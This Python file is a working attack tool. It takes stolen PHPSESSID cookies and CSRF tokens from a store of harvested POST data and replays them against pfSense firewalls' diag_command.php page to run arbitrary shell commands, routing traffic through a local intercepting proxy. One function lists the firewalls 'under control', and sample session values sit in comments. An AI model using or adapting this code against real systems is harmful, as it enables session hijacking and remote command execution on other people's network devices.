from Lib.Pull import *
from bs4 import BeautifulSoup


def Execute_pfSense(IP, task,Command):
    PHPSESSIDList, csrf_magicList = getAuthTokens4pfSense(IP)
    for PHPSESSID in PHPSESSIDList:
        for csrf_magic in csrf_magicList:
            #
            # TODO Threaded
            #
            if task == 'Execute_Command':
                r = executeBashCommand(IP, Command, PHPSESSID, csrf_magic)
            else:
                r = None


def getAuthTokens4pfSense(IP):
    PHPSESSIDList = []
    csrf_magicList = []

    j = pull('Posts')
    print(j)
    for element in j:
        # I do not think I need to check for the type.
        # /\ I need to verify that /\

        site = getSiteFromJson(element)
        # If this ip is in the site/url
        if re.search(r'' + str(IP), site):
            data = getDataFromJson(element)
            print(data)
            if 'PHPSESSID' in data:
                PHPSESSIDList.append(data['PHPSESSID'])
            if '__csrf_magic' in data:
                csrf_magicList.append(data['__csrf_magic'])
    return PHPSESSIDList, csrf_magicList


def executeBashCommand(IP, command, PHPSESSID_Value, csrf_magic_value):
    # IP = '10.1.1.254'
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # proxies=proxies
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.5'
    }
    # command = 'ls -la'
    # csrf_magic_value = 'sid:8067351b22f5cffbdba0ac6be2ed2814e8c9c53c,1566631347'
    files = {
        '__csrf_magic': (None, csrf_magic_value),
        'txtCommand': (None, command),
        'txtRecallBuffer': (None, command),
        'submit': (None, 'EXEC')
    }
    # PHPSESSID_Value = '3731142b861191803978f9330e3b7307'
    cookies = {
        'PHPSESSID': PHPSESSID_Value
    }
    r = requests.post('https://'+IP+'/diag_command.php',files=files, cookies=cookies, headers=headers, proxies=proxies, verify=False)
    if r.status_code == 200:
        html = r.text
        soup = BeautifulSoup(html, "lxml")  # make soup that is parse-able by bs
        output = soup.body.find('div', attrs={'class': 'panel-body'}).text.strip(' ')
        print(output)


def Print_all_pfSenses_under_control():
    j = pull('Posts')
    print(j)
    for element in j:
        try:
            data = getDataFromJson(element)
            # If this ip is in the site url
            if '__csrf_magic' in data:
                site = getSiteFromJson(element)
                print(site)
        except:
            pass


if __name__ == '__main__':
    Execute_pfSense('10.1.1.254', 'Execute_Command', 'ls -la')
    pass
    #executeBashCommand('10.1.1.254','ls -la','3731142b861191803978f9330e3b7307','sid:8067351b22f5cffbdba0ac6be2ed2814e8c9c53c,1566631347')